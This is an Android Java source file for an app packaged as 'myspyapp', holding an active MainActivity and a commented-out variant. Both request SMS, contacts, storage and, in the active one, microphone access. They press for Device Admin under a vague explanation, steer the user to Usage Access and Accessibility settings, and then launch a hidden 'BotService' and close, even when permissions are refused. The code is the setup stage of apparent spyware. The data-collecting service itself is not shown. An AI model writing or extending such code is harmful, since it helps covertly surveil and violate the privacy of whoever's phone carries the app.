
// permission - SMS, STORAGE, USE STATE


package com.mycompany.myspyapp;

import android.app.Activity;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private static final int DEVICE_ADMIN_REQUEST = 2;
    private boolean deviceAdminPrompted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (Build.VERSION.SDK_INT >= 23) {
            if (!hasRequiredPermissions()) {
                requestPermissions(new String[]{
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.RECORD_AUDIO
                }, PERMISSION_REQUEST_CODE);
            } else {
                promptForDeviceAdmin();
            }
        } else {
            promptForDeviceAdmin();
        }
    }

    private boolean hasRequiredPermissions() {
        boolean hasSms = checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        boolean hasStorage = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        boolean hasContacts = checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean hasAudioRec = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        
        return hasSms && hasStorage && hasContacts && hasAudioRec;
    }

    private void promptForDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(adminComponent) && !deviceAdminPrompted) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
            "This app can enhance its functionality with Device Admin privileges.");
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST);
            deviceAdminPrompted = true;
        } else {
            checkUsagePermissionAndStartService();
        }
    }

    private void checkUsagePermissionAndStartService() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Grant Usage Access permission", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            startBotServiceAndFinish();
        } else {
            startBotServiceAndFinish();
        }
    }

    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, 
                   android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void startBotServiceAndFinish() {
        startService(new Intent(this, BotService.class));
        finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == DEVICE_ADMIN_REQUEST) {
            checkUsagePermissionAndStartService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (hasRequiredPermissions()) {
                promptForDeviceAdmin();
            } else {
                Toast.makeText(this, "All permissions (SMS, Storage, Contacts) are required.", Toast.LENGTH_SHORT).show();
                startBotServiceAndFinish(); // Optional fallback
            }
        }
    }
}


//MainActivity with accessibility permussion


// permission - SMS, STORAGE, USE STATE, ACCESSIBILITY

/*
package com.mycompany.myspyapp;

import android.app.Activity;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private static final int DEVICE_ADMIN_REQUEST = 2;
    private boolean deviceAdminPrompted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (Build.VERSION.SDK_INT >= 23) {
            if (!hasRequiredPermissions()) {
                requestPermissions(new String[]{
                                       android.Manifest.permission.READ_SMS,
                                       android.Manifest.permission.READ_EXTERNAL_STORAGE,
                                       android.Manifest.permission.READ_CONTACTS
                                   }, PERMISSION_REQUEST_CODE);
            } else {
                promptForDeviceAdmin();
            }
        } else {
            promptForDeviceAdmin();
        }
    }

    private boolean hasRequiredPermissions() {
        boolean hasSms = checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        boolean hasStorage = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        boolean hasContacts = checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        return hasSms && hasStorage && hasContacts;
    }

    private void promptForDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(adminComponent) && !deviceAdminPrompted) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "This app can enhance its functionality with Device Admin privileges.");
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST);
            deviceAdminPrompted = true;
        } else {
            checkUsagePermissionAndStartService();
        }
    }

    private void checkUsagePermissionAndStartService() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Grant Usage Access permission", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            startAccessibilityPrompt(); // Continue after usage permission
        } else {
            startAccessibilityPrompt();
        }
    }

    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                                         android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void startAccessibilityPrompt() {
        if (!isAccessibilityEnabled()) {
            Toast.makeText(this, "Enable Accessibility Service for full functionality", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
        startBotServiceAndFinish();
    }

    private boolean isAccessibilityEnabled() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {}

        if (accessibilityEnabled == 1) {
            String services = Settings.Secure.getString(
                getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (services != null && services.toLowerCase().contains(getPackageName().toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private void startBotServiceAndFinish() {
        startService(new Intent(this, BotService.class));
        finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == DEVICE_ADMIN_REQUEST) {
            checkUsagePermissionAndStartService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (hasRequiredPermissions()) {
                promptForDeviceAdmin();
            } else {
                Toast.makeText(this, "All permissions (SMS, Storage, Contacts) are required.", Toast.LENGTH_SHORT).show();
                startBotServiceAndFinish(); // Optional fallback
            }
        }
    }
}
*/
